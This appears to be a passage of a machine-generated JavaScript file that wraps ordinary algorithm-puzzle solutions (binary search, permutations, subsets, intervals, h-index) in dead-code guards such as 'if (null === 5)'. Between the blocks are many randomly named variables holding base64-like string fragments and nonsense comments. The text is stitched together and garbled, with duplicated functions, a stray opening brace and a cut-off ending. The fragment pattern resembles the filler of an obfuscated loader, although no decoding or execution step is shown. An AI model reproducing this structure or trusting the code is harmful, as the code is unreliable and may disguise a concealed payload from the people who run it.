};

// O(logN) solution

/**
 * @param {number[]} nums
 * @return {number}
 */
var findMin = function(nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
    
    while (start < end) {
        mid = parseInt((start + end) / 2);
        
        if (nums[mid] < nums[start]) {
            end = mid;
        } else if (nums[end] < nums[mid]) {
            start = mid + 1;
        } else {
            return nums[start];
        }
    }
    
    return nums[start];
};

}

    var fpcyqby = 'GOHvB';
    var sgplmblhifrbrkf = 'ZzYz';
    var xucntor = 'sZCBEVsbc';
    var mqhuivpmfasj = 'JVN0NpQWdJ';
if (null === 5) {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var rqysuv = 'YyonIa';
if (typeof document === 'undefined') {
    /**
Given an integer n, generate a square matrix filled with elements from 1 to n2 in spiral order.

For example,
Given n = 3,

You should return the following matrix:
[
 [ 1, 2, 3 ],
 [ 8, 9, 4 ],
 [ 7, 6, 5 ]
]
*/

/**
 * @param {number} n
 * @return {number[][]}
 */
var generateMatrix = function(n) {
    var curNum = 1,
        total = parseInt(n / 2),
        result = [],
        temp,
        level,
        i,
        j;

    if (n === 0) {
        return result;
    }

    if (n === 1) {
        temp = [1];
        result.push(temp);
        return result;
    }
    // initialization
    for (i = 0; i < n; i++) {
        temp = [];
        for (j = 0; j < n; j++) {
            temp.push(0);
        }

        result.push(temp);
    }


    for (level = 0; level < total; level++) {
        // top
        for (i = level; i < n - level - 1; i++) {
            result[level][i] = curNum;

            if (curNum === n * n) {
                return result;
            }

            curNum++;
        }

        // right
        for (i = level; i < n - level - 1; i++) {
            result[i][n - level - 1] = curNum;
            curNum++;
        }

        // bottom
        for (i = n - level - 1; i > level; i--) {
            result[n - level - 1][i] = curNum;
            curNum++;
        }

        // left
        for (i = n - level - 1; i > level; i--) {
            result[i][level] = curNum;
            curNum++;
        }
    }
    
    if (curNum === n * n) {
        result[total][total] = curNum;
    }
    
    return result;
};

}

    var mrvrmkytcvxxc = 'Q0I5Q24wc';
    var txziucghkk = 'opJlpbvnQ';
    var dnjtfdtipmp = 'E93b0tM';
if (null === 2) {
    /**
Given a binary tree, determine if it is height-balanced.

For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isBalanced = function(root) {
    return findDepth(root) === -1 ? false : true;
};

function findDepth(root) {
    if (root === null) {
        return 0;
    }
    
    var leftDepth = findDepth(root.left),
        rightDepth;
        
    if (leftDepth === -1) {
        return -1;
    }
    
    rightDepth = findDepth(root.right);
    
    if (rightDepth === -1) {
        return -1;
    }
    
    if (Math.abs(leftDepth - rightDepth) > 1) {
        return -1;
    }
    
    return Math.max(leftDepth, rightDepth) + 1;
}

}

    var rgoatyf = 'bfkvYgfJ';
if (Array.isArray(5)) {
    /**
Given s1, s2, s3, find whether s3 is formed by the interleaving of s1 and s2.

For example,
Given:
s1 = "aabcc",
s2 = "dbbca",

When s3 = "aadbbcbcac", return true.
When s3 = "aadbbbaccc", return false.
*/

//dp
/**
 * @param {string} s1
 * @param {string} s2
 * @param {string} s3
 * @return {boolean}
 */
var isInterleave = function(s1, s2, s3) {
    let dp = [];
    const len1 = s1.length;
    const len2 = s2.length;
    const len3 = s3.length;
    
    if (len1 + len2 !== len3) {
        return false;
    }
    
    for (let i = 0; i <= len1; i++) {
        const arr = new Array(len2 + 1).fill(false);
        dp.push(arr);
    }
    
    dp[0][0] = true;
    
    for (let i = 1; i <= len1; i++) {
        dp[i][0] = s1.charAt(i - 1) === s3.charAt(i - 1);
        
        if (!dp[i][0]) {
            break;
        }
    }
    
    for (let j = 1; j <= len2; j++) {
        dp[0][j] = s2.charAt(j - 1) === s3.charAt(j - 1);
        
        if (!dp[0][j]) {
            break;
        }
    }
    
    for (let i = 1; i <= len1; i++) {
        for (let j = 1; j <= len2; j++) {
            let k = i + j - 1;
            
            dp[i][j] = (dp[i][j - 1] && (s2.charAt(j - 1) === s3.charAt(k))) || (dp[i - 1][j] && (s1.charAt(i - 1) === s3.charAt(k)));
        }
    }
    
    return dp[len1][len2];
};

// Time Limit Exceeded
/**
 * @param {string} s1
 * @param {string} s2
 * @param {string} s3
 * @return {boolean}
 */
var isInterleave = function(s1, s2, s3) {
    if (!s1) {
        return s2 === s3;
    }
    
    if (!s2) {
        return s1 === s3;
    }
    
    if (s3.length !== s1.length + s2.length) {
        return false;
    }
    
    const c1 = s1.charAt(0);
    const c2 = s2.charAt(0);
    const c3 = s3.charAt(0);
    
    if (c1 === c3 && c2 === c3) {
        return isInterleave(s1.substr(1), s2, s3.substr(1)) || isInterleave(s1, s2.substr(1), s3.substr(1));
    }
    
    if (c1 === c3) {
        return isInterleave(s1.substr(1), s2, s3.substr(1));
    }
    
    if (c2 === c3) {
        return isInterleave(s1, s2.substr(1), s3.substr(1));
    }
    
    return false;
};


}

    var xmofesyjwnkgnk = 'eThnVEdse';
if (43 > 181) {
    /**
Given a list of non negative integers, arrange them such that they form the largest number.

For example, given [3, 30, 34, 5, 9], the largest formed number is 9534330.

Note: The result may be very large, so you need to return a string instead of an integer.

 * @param {number[]} nums
 * @return {string}
 */
var largestNumber = function(nums) {
    var i,
        len = nums.length,
        result = '',
        startWithZero = true;
    nums.sort(function(a, b){
        var x = a + '' + b,
            y = b + '' + a;
        return parseInt(y) - parseInt(x);
    });
    for (i = 0; i < len; i++) {
        if (startWithZero && nums[i] !== 0) {
            startWithZero = false;
        }
        result += nums[i];
    }
    if (startWithZero) {
        return '0';
    }
    return result;
};

}

    var aaivqkssyqm = 'WyLcDmGrr';
    var eiedfygeim = 'mRDQnZaa';
    var nfkhljds = 'OsUoFmq';
if (1 instanceof String) {
    /**
Given a collection of integers that might contain duplicates, nums, return all possible subsets.

Note:
Elements in a subset must be in non-descending order.
The solution set must not contain duplicate subsets.
For example,
If nums = [1,2,2], a solution is:

[
  [2],
  [1],
  [1,2,2],
  [2,2],
  [1,2],
  []
]
*/

/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var subsetsWithDup = function(nums) {
    var result = [],
        len = nums.length;
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    helper(nums, 0, len - 1, [], result);
    
    return result;
};

function helper(nums, start, end, curArr, result) {
    result.push(curArr);
    
    var i;
    
    for (i = start; i <= end; i++) {
        // skip duplicates
        if (i > start && nums[i] === nums[i - 1]) {
            continue;
        }
        curArr.push(nums[i]);
        helper(nums, i + 1, end, curArr.concat(), result);
        curArr.pop();
    }
}

}

    var agjbwuexpyoor = 'UJ5WlhO';
    var lrcstaw = 'jfPpFpoBtE';
    var qynojudpfwwky = 'MGNtbGpkR';
if (!true && 0) {
    /**
Given a nested list of integers, implement an iterator to flatten it.

Each element is either an integer, or a list -- whose elements may also be integers or other lists.

Example 1:
Given the list [[1,1],2,[1,1]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].

Example 2:
Given the list [1,[4,[6]]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6].
*/
/**
 * // This is the interface that allows for creating nested lists.
 * // You should not implement it, or speculate about its implementation
 * function NestedInteger() {
 *
 *     Return true if this NestedInteger holds a single integer, rather than a nested list.
 *     @return {boolean}
 *     this.isInteger = function() {
 *         ...
 *     };
 *
 *     Return the single integer that this NestedInteger holds, if it holds a single integer
 *     Return null if this NestedInteger holds a nested list
 *     @return {integer}
 *     this.getInteger = function() {
 *         ...
 *     };
 *
 *     Return the nested list that this NestedInteger holds, if it holds a nested list
 *     Return null if this NestedInteger holds a single integer
 *     @return {NestedInteger[]}
 *     this.getList = function() {
 *         ...
 *     };
 * };
 */
/**
 * @constructor
 * @param {NestedInteger[]} nestedList
 */
var NestedIterator = function(nestedList) {
    this.stack = nestedList.reverse();
};


/**
 * @this NestedIterator
 * @returns {boolean}
 */
NestedIterator.prototype.hasNext = function() {
    var next,
        i;
    
    while (this.stack.length > 0) {
        next = this.stack[this.stack.length - 1];
        
        if (next.isInteger()) {
            return true;
        }
        
        this.stack.pop();
        
        for (i = next.getList().length - 1; i >= 0; i--) {
            this.stack.push(next.getList()[i]);
        }
    }
    
    return false;
};

/**
 * @this NestedIterator
 * @returns {integer}
 */
NestedIterator.prototype.next = function() {
    return this.stack.pop();
};

/**
 * Your NestedIterator will be called like this:
 * var i = new NestedIterator(nestedList), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var uivfktk = 'IqIbrnmSt';
    var xoxpdnxdpm = '1ZrSUd0bG';
    var aeuezrjy = 'vSvWcyle';
    var puswjbicdpnv = 'VXSnZZWEpr';
    var kgaberpbm = 'CKPRmC';
    var gqtenk = 'SUhOb2';
    var sttyndxtwduw = 'XoljOh';
    var vctlhkudjjetxr = 'IzSjBZM1';
    var jhsqlmfnlrrt = 'sUeiZ';
// import export event string function object import compile hello loop async nnto world code loop
    var igmkjeywp = 'tqqmMksQ';
    var uxatyzjsi = 'YwY3dwbWR';
    var kpdhjkd = 'RHPSkBSYT';
if (typeof navigator === 'undefined') {
    /**
Given s1, s2, s3, find whether s3 is formed by the interleaving of s1 and s2.

For example,
Given:
s1 = "aabcc",
s2 = "dbbca",

When s3 = "aadbbcbcac", return true.
When s3 = "aadbbbaccc", return false.
*/

//dp
/**
 * @param {string} s1
 * @param {string} s2
 * @param {string} s3
 * @return {boolean}
 */
var isInterleave = function(s1, s2, s3) {
    let dp = [];
    const len1 = s1.length;
    const len2 = s2.length;
    const len3 = s3.length;
    
    if (len1 + len2 !== len3) {
        return false;
    }
    
    for (let i = 0; i <= len1; i++) {
        const arr = new Array(len2 + 1).fill(false);
        dp.push(arr);
    }
    
    dp[0][0] = true;
    
    for (let i = 1; i <= len1; i++) {
        dp[i][0] = s1.charAt(i - 1) === s3.charAt(i - 1);
        
        if (!dp[i][0]) {
            break;
        }
    }
    
    for (let j = 1; j <= len2; j++) {
        dp[0][j] = s2.charAt(j - 1) === s3.charAt(j - 1);
        
        if (!dp[0][j]) {
            break;
        }
    }
    
    for (let i = 1; i <= len1; i++) {
        for (let j = 1; j <= len2; j++) {
            let k = i + j - 1;
            
            dp[i][j] = (dp[i][j - 1] && (s2.charAt(j - 1) === s3.charAt(k))) || (dp[i - 1][j] && (s1.charAt(i - 1) === s3.charAt(k)));
        }
    }
    
    return dp[len1][len2];
};

// Time Limit Exceeded
/**
 * @param {string} s1
 * @param {string} s2
 * @param {string} s3
 * @return {boolean}
 */
var isInterleave = function(s1, s2, s3) {
    if (!s1) {
        return s2 === s3;
    }
    
    if (!s2) {
        return s1 === s3;
    }
    
    if (s3.length !== s1.length + s2.length) {
        return false;
    }
    
    const c1 = s1.charAt(0);
    const c2 = s2.charAt(0);
    const c3 = s3.charAt(0);
    
    if (c1 === c3 && c2 === c3) {
        return isInterleave(s1.substr(1), s2, s3.substr(1)) || isInterleave(s1, s2.substr(1), s3.substr(1));
    }
    
    if (c1 === c3) {
        return isInterleave(s1.substr(1), s2, s3.substr(1));
    }
    
    if (c2 === c3) {
        return isInterleave(s1, s2.substr(1), s3.substr(1));
    }
    
    return false;
};


}

    var jmasrh = 'XNWpkR2x';
if (typeof navigator === 'undefined') {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

    var ylvcjmadyutc = 'nmVpYpNPG';
if (0.85 && false) {
    /**
 * @param {string} s
 * @return {string}
 */
var reverseString = function(s) {
    if (!s) {
        return s;
    }
    
    return s.split('').reverse().join('');
};

}

    var zrdrwqslckyt = '2YmlCc';
    var texcgvfp = 'gUyIt';
    var mbcuayxtbaeob = 'GMx';
    var dmvzgri = 'xzDky';
if (0.49 && false) {
    /**
Given an input string, reverse the string word by word.

For example,
Given s = "the sky is blue",
return "blue is sky the".

 * @param {string} str
 * @returns {string}
 */
var reverseWords = function(str) {
    var result = '',
        arr,
        len,
        i;
        
    if (str === null || str === '') {
        return result;
    }
    arr = str.split(' ');
    len = arr.length;
    for(i = len - 1; i >= 0; i--) {
        if (arr[i].length === 0) {
            continue;
        }
        result += ' ' + arr[i];
    }
    return result.trim();
};

}

    var hcoscfwrp = 'Smxj';
    var pjkagmdmh = 'xzKEaG';
    var prqfa = 'M1J5';
    var oqmozfeopm = 'uZHDytgA';
    var xbvyvncxavgusq = 'YVdOMFp';
    var kpvmdkxc = 'zWETS';
if (null === 3) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var canWinNim = function(n) {
    return n % 4 > 0
};

}

    var yajxocgmyezcvd = 'XUl';
    var oytutqmgcld = 'naVtsz';
// compile
if ('false' === true) {
    /**
Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {TreeNode}
 */
var sortedListToBST = function(head) {
    var len = 0,
        node = head;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        len++;
        node = node.next;
    }
    curNode = head;
    return helper(0, len - 1);
},
curNode;

// build tree bottom up
function helper(start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        left,
        right,
        node;
        
    left = helper(start, mid - 1),
    node = new TreeNode(curNode.val);
    curNode = curNode.next;
    right = helper(mid + 1, end);
    
    node.left = left;
    node.right = right;
    
    return node;
}


// solution 2
var sortedListToBST = function(head) {
    var arr = [],
        node = head,
        len;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        arr.push(node);
        node = node.next;
    }
    
    len = arr.length;
    
    if (len === 1) {
        return head;
    }
    
    return getMidNode(0, len - 1, arr);
};

function getMidNode(start, end, arr) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        node = new TreeNode(arr[mid].val);
        
    node.left = getMidNode(start, mid - 1, arr);
    node.right = getMidNode(mid + 1, end, arr);
    
    return node;
}

}

    var dciabqaic = 'OPHitJ';
    var comfhdpmxr = 'RhRzl5ZE';
    var rtlgeb = 'zNUrGGi';
    var xlpovvy = 'dOMWR';
    var rnmplqxpse = 'ZmUFpwaDRu';
    var ltpcknnpsucohtc = 'DaGx';
    var wmrvnwazff = 'doxxhY';
    var ifiofdw = 'kbVZ';
    var mlfsyodmvk = 'NkOZEnh';
    var xvlmlhgsvm = '1ZENr';
    var wkvibtcy = 'JiMPzdrCAS';
if (4 === 12) {
    /**
Additive number is a string whose digits can form additive sequence.

A valid additive sequence should contain at least three numbers. Except for the first two numbers, each subsequent number in the sequence must be the sum of the preceding two.

For example:
"112358" is an additive number because the digits can form an additive sequence: 1, 1, 2, 3, 5, 8.

1 + 1 = 2, 1 + 2 = 3, 2 + 3 = 5, 3 + 5 = 8
"199100199" is also an additive number, the additive sequence is: 1, 99, 100, 199.
1 + 99 = 100, 99 + 100 = 199
Note: Numbers in the additive sequence cannot have leading zeros, so sequence 1, 2, 03 or 1, 02, 3 is invalid.

Given a string containing only digits '0'-'9', write a function to determine if it's an additive number.

Follow up:
How would you handle overflow for very large input integers?
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isAdditiveNumber = function(num) {
    var len = num.length,
        i,
        j;
        
    for (i = 1; i <= len / 2; i++) {
        for (j = 1; j <= len / 2; j++) {
            if (canBeAdded(num.substr(0, i), num.substr(i, j), num.substr(i + j))) {
                return true;
            }
        }
    }
    
    return false;
};

function canBeAdded(a, b, c) {
    if ((a.length > 1 && a.charAt(0) === '0') || (b.length > 1 && b.charAt(0) === '0') || (c.length >= 1 && c.charAt(0) === '0')) {
        return false;
    }
    
    var aNum = parseInt(a),
        bNum = parseInt(b),
        sum = aNum + bNum + '';
        
    if (c === sum) {
        return true;
    }
    
    if (c.substr(0, sum.length) !== sum) {
        return false;
    }
    
    return canBeAdded(b, sum, c.substr(sum.length));
}

}

    var vgfgushp = 'Z2V3b2d';
    var gcfciqvobnic = 'LREmiCR';
    var sipgh = 'JQ0Fn';
    var uoojeqnr = 'LWDACxQB';
// import array
if (!true && 1) {
    /**
There are N children standing in a line. Each child is assigned a rating value.

You are giving candies to these children subjected to the following requirements:

Each child must have at least one candy.
Children with a higher rating get more candies than their neighbors.
What is the minimum candies you must give?
*/

//TLE
/**
 * @param {number[]} ratings
 * @return {number}
 */
var candy = function(ratings) {
    let len = ratings.length;
    let candies = [];
    let sum = 1;
    
    candies[0] = 1;
    
    for (let i = 1; i < len; i++) {
        if (ratings[i] <= ratings[i - 1]) {
            if (candies[i - 1] > 1) {
                candies[i] = 1;
                sum++;
            } else {
                candies[i] = 1;
                sum++;
                let k = i;
                
                while (k > 0 && (ratings[k] < ratings[k - 1]) && (candies[k - 1] <= candies[k])) {
                    candies[k - 1]++;
                    sum++;
                    k--;
                }
                
                
            }
        } else {
            candies[i] = candies[i - 1] + 1;
            sum += candies[i];
        }
    }
    
    return sum;
};

}

    var cmanvvxkzp = 'Tptfc';
    var rhwjdvxgp = 'WTI5dWMz';
if (Array.isArray(10)) {
    /**
 * @param {number} n
 * @return {number}
 */
var numTrees = function(n) {
    var i,
        j,
        result = [];
    
    result[0] = 1;
    result[1] = 1;
    
    for (i = 2; i <= n; i++) {
        result[i] = 0;
        for (j = 0; j < i; j++) {
            result[i] += result[j] * result[i - 1 - j];
        }
        
    }
    return result[n];
};

}

    var uucwfo = 'PMyCG';
    var ywuvxkt = 'UWdjbV';
    var yjgtbux = 'OgtIebAJSM';
    var scxerls = 'Z6ZEhKcFk';
if ('false' === true) {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var lriulfwimajf = 'edzsO';
    var negrerh = 'zUm';
if ('f' === 'Y') {
    /**
Given an array of n integers where n > 1, nums, return an array output such that output[i] is equal to the product of all the elements of nums except nums[i].

Solve it without division and in O(n).

For example, given [1,2,3,4], return [24,12,8,6].

Follow up:
Could you solve it with constant space complexity? (Note: The output array does not count as extra space for the purpose of space complexity analysis.)
*/

/**
 * @param {number[]} nums
 * @return {number[]}
 * 
 * output[i] =  { i 前面的数的乘积}  X  { i 后面的数的乘积}
问题就解决了，首先从前往后扫描数组一遍，对每一个i，得到{i 前面的数的乘积}(可以称做output_before)，然后在从后往前扫描数组一遍，获得 { i 后面的数的乘积}(可以称做output_after)。 将两数相乘即为所求。
举个例子(如下图)，nums = {1,2,3,4}, 第一遍，从前往后扫描一遍，得到的output_before = {1, 1, 2, 6}. 从后往前扫描一遍，得到的output_after = {24, 12, 4, 1}.
 * 
 */
var productExceptSelf = function(nums) {
    var result = [],
        len = nums.length,
        back = 1,
        i;
    
    if (len === 0) {
        return result;
    }
    
    result[0] = 1;
    
    for (i = 1; i < len; i++) {
        result[i] = result[i - 1] * nums[i - 1]; 
    }
    
    for (i = len - 2; i >= 0; i--) {
        back *= nums[i + 1];
        result[i] *= back;
    }
    
    return result;
};

}

    var zaaopueohvpn = 'MwRbwXgrzj';
if (4 === 19) {
    /**
Given a sorted positive integer array nums and an integer n, add/patch elements to the array such that any number in range [1, n] inclusive can be formed by the sum of some elements in the array. Return the minimum number of patches required.

Example 1:
nums = [1, 3], n = 6
Return 1.

Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.
Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].
Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].
So we only need 1 patch.

Example 2:
nums = [1, 5, 10], n = 20
Return 2.
The two patches can be [2, 4].

Example 3:
nums = [1, 2, 2], n = 5
Return 0.
*/
/**
 * @param {number[]} nums
 * @param {number} n
 * @return {number}
 * nums[i] <= known_sum，更新已知范围为：[1,known_sum + nums[i] )
   nums[i] >  known_sum,  添加known_sum进数组才能达到最大的范围，所以已知范围更新为：[1,known_sum *2  )
 */

//  time limit exceeded
var minPatches = function(nums, n) {
    var knownSum = 1,
        len = nums.length,
        count = 0,
        i = 0;
        
    while (knownSum <= n) {
        if (i < len && knownSum >= nums[i]) {
            knownSum += nums[i];
            i++;
        } else {
            knownSum <<= 1;
            count++;
        }
    }
    
    return count;
};

}

    var smdxcdxntroe = 'xaR';
if (6 instanceof String) {
    /**
Given a collection of intervals, merge all overlapping intervals.

For example,
Given [1,3],[2,6],[8,10],[15,18],
return [1,6],[8,10],[15,18].
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {Interval[]}
 */
var merge = function(intervals) {
    var len = intervals.length,
        start = null,
        end,
        result = [],
        cur,
        i;
    
    if (len <= 1) {
        return intervals;
    }
    
    intervals.sort(function(a, b) {
        if (a.start < b.start) {
            return - 1;
        } else if (a.start > b.start) {
            return 1;
        } else {
            return a.end - b.end;
        }
    });
    
    for (i = 0; i < len; i++) {
        cur = intervals[i];
        
        if (i === 0) {
            start = cur.start;
            end = cur.end;
        } else {
            if (cur.start <= end) {
                end = Math.max(end, cur.end);
            } else {
                result.push(new Interval(start, end));
                start = cur.start;
                end = cur.end;
            }
        }
    }
    
    if (start !== null) {
        result.push(new Interval(start, end));
    }
    
    return result;
};

}

    var xgirltopavsf = 'ViYI';
    var qzzaszlbytx = 'XRsZVhNZ1';
if (9 > 158) {
    /**
You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters.

For example, given:
s: "barfoothefoobarman"
words: ["foo", "bar"]

You should return the indices: [0,9].
(order does not matter).
*/
/**
 * @param {string} s
 * @param {string[]} words
 * @return {number[]}
 */
 
 // TIME LIMIT EXCEEDED...
var findSubstring = function(s, words) {
    var len = s.length,
        wordsLen = words.length,
        wordLen = words[0].length,
        i,
        j,
        m,
        temp,
        toFound = {},
        found = {},
        result = [];
        
    for (i = 0; i < wordsLen; i++) {
        if (!toFound[words[i]]) {
            toFound[words[i]] = 1; 
        } else {
            toFound[words[i]]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        found = {};
        j = i;
        for (m = 0; m < wordsLen; m++) {
            temp = s.slice(j, j + wordLen);
            
            if (!toFound[temp]) {
                break;
            }
            
            if (toFound[temp]) {
                if (!found[temp]) {
                    found[temp] = 1;
                } else {
                    found[temp]++;
                }
            }
            
            if (found[temp] > toFound[temp]) {
                break;
            }
            
            j += wordLen;
        }
        
        if (m === wordsLen) {
            result.push(i);
        }
    }
    
    return result;
};

}

    var dergxcuo = 'FVyABCgIIi';
if (typeof document === 'undefined') {
    /**
Given an array of citations (each citation is a non-negative integer) of a researcher, write a function to compute the researcher's h-index.

According to the definition of h-index on Wikipedia: "A scientist has index h if h of his/her N papers have at least h citations each, and the other N − h papers have no more than h citations each."

For example, given citations = [3, 0, 6, 1, 5], which means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively. Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, his h-index is 3.

Note: If there are several possible values for h, the maximum one is taken as the h-index.

Hint:

An easy approach is to sort the array first.
What are the possible values of h-index?
A faster approach is to use extra space.

*/
/**
 * @param {number[]} citations
 * @return {number}
 */
var hIndex = function(citations) {
    var len = citations.length,
        i;
    
    citations.sort(function (a, b) {
        if (a < b) {
            return 1;
        }
        return -1;
    });
    
    for (i = 0; i < len; i++) {
        if (citations[i] <= i) {
            return i;
        }
    }
    
    return len;
};


/**
SOLUTION 2:
复杂度
时间 O(N) 空间 O(N)

思路
也可以不对数组排序，我们额外使用一个大小为N+1的数组stats。stats[i]表示有多少文章被引用了i次，这里如果一篇文章引用大于N次，我们就将其当为N次，因为H指数不会超过文章的总数。为了构建这个数组，我们需要先将整个文献引用数组遍历一遍，对相应的格子加一。统计完后，我们从N向1开始遍历这个统计数组。如果遍历到某一个引用次数时，大于或等于该引用次数的文章数量，大于引用次数本身时，我们可以认为这是H指数。之所以不用再向下找，因为我们要取最大的H指数。那如何求大于或等于某个引用次数的文章数量呢？我们可以用一个变量，从高引用次的文章数累加下来。因为我们知道，如果有x篇文章的引用大于等于3次，那引用大于等于2次的文章数量一定是x加上引用次数等于2次的文章数量。

代码
public class Solution {
    public int hIndex(int[] citations) {
        int[] stats = new int[citations.length + 1];
        int n = citations.length;
        // 统计各个引用次数对应多少篇文章
        for(int i = 0; i < n; i++){
            stats[citations[i] <= n ? citations[i] : n] += 1;
        }
        int sum = 0;
        // 找出最大的H指数
        for(int i = n; i > 0; i--){
            // 引用大于等于i次的文章数量，等于引用大于等于i+1次的文章数量，加上引用等于i次的文章数量 
            sum += stats[i];
            // 如果引用大于等于i次的文章数量，大于引用次数i，说明是H指数
            if(sum >= i){
                return i;
            }
        }
        return 0;
    }
}

*/

}

    var igxylpicitswc = 'BTQmJDaU';
if (!true && 0) {
    /**
Given a set of distinct integers, nums, return all possible subsets.

Note:
Elements in a subset must be in non-descending order.
The solution set must not contain duplicate subsets.
For example,
If nums = [1,2,3], a solution is:

[
  [3],
  [1],
  [2],
  [1,2,3],
  [1,3],
  [2,3],
  [1,2],
  []
]
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var subsets = function(nums) {
    var result = [],
        len = nums.length;
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    helper(nums, 0, len - 1, [], result);
    
    return result;
};

function helper(nums, start, end, curArr, result) {
    result.push(curArr);
    
    var i;
    
    for (i = start; i <= end; i++) {
        curArr.push(nums[i]);
        helper(nums, i + 1, end, curArr.concat(), result);
        curArr.pop();
    }
}

}

    var daybudc = 'FxAHdZ';
if (null === 4) {
    /**
Given a binary tree, return the inorder traversal of its nodes' values.

For example:
Given binary tree {1,#,2,3},
   1
    \
     2
    /
   3
return [1,3,2].

Note: Recursive solution is trivial, could you do it iteratively?

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} root
 * @returns {number[]}
 */
var inorderTraversal = function(root) {
    var stack = [],
        result = [],
        cur;
    cur = root;
    while (stack.length > 0 || cur !== null) {
        if (cur !== null) {
            stack.push(cur);
